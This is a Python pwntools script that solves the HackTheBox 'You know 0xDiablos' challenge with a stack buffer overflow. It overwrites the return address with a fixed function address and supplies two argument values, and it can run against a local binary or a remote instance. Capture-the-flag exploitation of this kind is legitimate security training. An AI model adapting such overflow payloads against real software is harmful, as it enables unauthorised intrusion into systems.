#!/usr/bin/env python

###########################################################
#                                                         #
# HackTheBox exploit for "You know 0xDiablos" challenge   #
#                                                         #
# Paolo Monti - 2022                                      #
#                                                         #
# p.monti@protonmail.com                                  #
#                                                         #
###########################################################

from sys import exit, argv
from os.path import basename
from pwn import *

########## GLOBAL VARIABLES ###########

# Note: the IP and Port of the remote server can change according to the instance of the VM spawned by HackTheBox
IP = '0.0.0.0'   # CHANGE THIS
Port = 666       # CHANGE THIS
payload = cyclic(188) + p32(0x080491e2) + p32(0x90909090) + p32(0xdeadbeef) + p32(0xc0ded00d) # Smash the stack and set our data
TEST_OPTION = '-t'
EXPLOIT_OPTION = '-x'
LOCAL_EXECUTABLE = './vuln'

########## HELPER FUNCTIONS ##########

def usage():
        """ Display usage """
        print(f"Usage: {basename(__file__)} [option]\n\n\t-t\ttest the exploit locally\n\t-x\trun the exploit remotely")
        exit(1)

def exploit( kind ):
        """ Exploit the vulnerable binary file hosted on a remote server or stored locally """
        try:
                context.log_level = 'ERROR' # Change the level if more information are required
                io = remote(IP, Port) if (kind == EXPLOIT_OPTION) else process(LOCAL_EXECUTABLE)
                print( io.readlineS() )
                io.sendline(payload)
                print( io.readallS()[len(payload):] ) # Discarding payload echoed inside the string read
        except Exception as e:
                print(f"Exception occurred trying to exploit the vulnerable program: {e}")

########## MAIN BODY ##########

param = None if (len(argv) != 2) else argv[1].lower()
exploit(param) if (param == EXPLOIT_OPTION or param == TEST_OPTION) else usage()
